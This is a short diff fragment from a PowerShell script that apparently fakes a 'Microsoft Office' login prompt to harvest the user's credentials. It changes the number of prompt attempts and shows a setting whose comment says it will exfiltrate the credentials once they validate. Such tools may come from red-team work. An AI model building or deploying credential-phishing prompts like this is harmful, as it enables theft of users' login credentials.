@@ -30,7 +30,7 @@ $targetUser = $env:username
 $companyEmail = "contoso.com"
 $promptCaption = "Microsoft Office"
 $promptMessage = "Connecting to: $targetUser@$companyEmail"
-$maxTries = 2 # maximum number of times to invoke prompt
+$maxTries = 1 # maximum number of times to invoke prompt
 $delayPrompts = 2 # seconds between prompts
 $validateCredentials = $true # interrupt $maxTries and immediately exfil if credentials are valid
 
